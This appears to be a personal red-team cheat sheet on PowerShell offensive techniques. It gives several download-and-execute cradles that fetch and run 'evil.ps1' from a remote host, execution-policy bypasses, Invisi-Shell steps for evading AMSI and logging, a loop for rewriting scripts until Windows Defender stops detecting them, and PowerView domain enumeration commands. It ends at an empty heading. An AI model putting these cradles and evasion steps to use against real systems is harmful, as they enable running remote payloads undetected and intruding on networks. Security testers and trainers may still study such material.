### Powershell Scripts/Modules


Import Script or Module :heavy_check_mark:
```
Import-Module C:\path\to\script.ps1
```

Find all commands in module 
```
Get-Command -Module <modulename>
```

Download & Execute Cradle :heavy_check_mark:
```
iex (New-Object Net.WebClient) .DownloadString('https://webservers/payload.ps1')
```

??
```
$ie=New-Object -ComObjectInternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://192.168.230.1/evil.ps1');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```
```
$h=New-Object -ComObject
Msxml2.XMLHTTP;$h.open('GET','http://192.168.230.1/evil.ps1',$false);$h.send();iex
$h.responseText
```
```
$wr = [System.NET.WebRequest]::Create("http://192.168.230.1/evil.ps1")
$r = $wr.GetResponse()
IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```




### Powershell Detection
- System-wide transcription
- Script Block Logging
- AMSI (AntMalware Scan Interface)
- CLM (Constrained Language Mode)
 - Integration with Applocker & WDAC (Device Guard)

#### Bypasses
##### Execution Policy
:heavy_check_mark:
```
powershell -ExecutionPolicy bypass
```
```
powershell -c <cmd>
```
:heavy_check_mark:
```
powershell -encodedcommand
```
```
$env:PSExecutionPolicyPreference="bypass"
```

#### Security
##### AMSI

[Invisi-Shell](https://github.com/OmerYa/Invisi-Shell) :sparkles:

###### **with admin privileges**
```
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}
set COR_PROFILER_PATH=%~dp0InvisiShellProfiler.dll

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
set COR_PROFILER_PATH=
```

###### **with non-admin privileges**
```
set COR_ENABLE_PROFILING=1
set COR_PROFILER={cf0d821e-299b-5307-a3d8-b283c03916db}

REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /f
REG ADD "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}\InprocServer32" /ve /t REG_SZ /d "%~dp0InvisiShellProfiler.dll" /f

powershell

set COR_ENABLE_PROFILING=
set COR_PROFILER=
REG DELETE "HKCU\Software\Classes\CLSID\{cf0d821e-299b-5307-a3d8-b283c03916db}" /f
```

:broom: can be cleaned up with an *exit* command

#### AV Signatures - Windows Defender
[AMSITrigger] (https://github.com/RythmStick/AMSITrigger)
This application will go through the script and indicate where it is being detected
```
AmsiTrigger_x64.exe -i C:\path\*.ps1
```
1. Scan using AMSITrigger
2. Modify the detected code
3. Rescan
4. Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank”

Further steps can be taken to full obfuscate scripts with [Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)



### Enumeration
#### PowerView
Get Current Domain
```
Get-Domain
```
Get object of another domain
```
Get-Domiain -Domain xxxxx.local
```
Get domain SID for current domain
```
Get-DomainSID
```
Get domain policy for the current domain
```
Get-DomainPolicyData
```
#### ActiveDirectory Module










